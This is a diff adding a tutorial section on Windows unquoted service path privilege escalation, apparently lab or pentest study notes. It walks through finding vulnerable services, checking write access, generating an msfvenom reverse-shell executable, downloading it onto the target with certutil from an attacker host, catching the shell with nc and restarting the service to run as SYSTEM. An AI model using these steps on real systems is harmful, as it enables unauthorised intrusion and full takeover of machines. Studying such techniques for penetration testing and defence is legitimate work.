@@ -152,3 +152,99 @@ C:\Program Files\My Service\service.exe
 C:\Program.exe ❌
 C:\Program Files\My.exe ❌
 C:\Program Files\My Service\service.exe ✅
+
+**If you can write to any of those locations, you can hijack the service!**
+
+```
+Quoted Path (Secure):
+"C:\Program Files\My Service\service.exe"
+└── Windows knows exactly where the file is ✅
+
+Unquoted Path (Vulnerable):
+C:\Program Files\My Service\service.exe
+├── Try: C:\Program.exe
+├── Try: C:\Program Files\My.exe
+└── Try: C:\Program Files\My Service\service.exe
+
+If you can create C:\Program.exe → YOUR code runs as SYSTEM! 🚨
+```
+
+
+## Finding Vulnerable Services
+
+### Method 1: Manual Search
+```powershell
+# List all services with unquoted paths
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+```
+
+### Method 2: PowerUp
+```powershell 
+. .\PowerUp.ps1
+Get-UnquotedService
+```
+
+### Method 3: Using PowerShell
+```powershell
+Get-WmiObject Win32_Service | Where-Object {
+    $_.PathName -notmatch '^"' -and 
+    $_.PathName -match ' ' -and 
+    $_.StartMode -eq 'Auto'
+} | Select-Object Name, DisplayName, PathName, StartName
+```
+
+## Exploitation Example
+### Scenario: Found vulnerable service
+```
+# Check service details
+sc qc unquotedsvc
+```
+
+**Output:**
+```
+BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+SERVICE_START_NAME : LocalSystem
+START_TYPE         : 2 AUTO_START
+```
+
+**Attack paths to try (in order):**
+- C:\Program.exe
+- C:\Program Files\Unquoted.exe
+- C:\Program Files\Unquoted Path Service\Common.exe
+
+### Step-by-Step Exploitation
+#### Step 1: Check write permissions
+```
+# Check if you can write to C:\Program Files\
+accesschk.exe /accepteula -uwdq "C:\Program Files\"
+
+# Check subdirectories
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+```
+
+#### Step 2: Create malicious executable
+```
+# On Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o Common.exe
+```
+
+#### Step 3: Upload to vulnerable path
+```
+# Upload to writable location
+certutil -urlcache -f http://10.10.10.5/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+
+#### Step 4: Start listener
+```
+nc -lvnp 4444
+```
+
+
+#### Step 5: Restart service
+```
+# Need permissions to restart
+net stop unquotedsvc
+net start unquotedsvc
+```
+
+**Alternative:** Wait for system reboot (if service is AUTO_START)
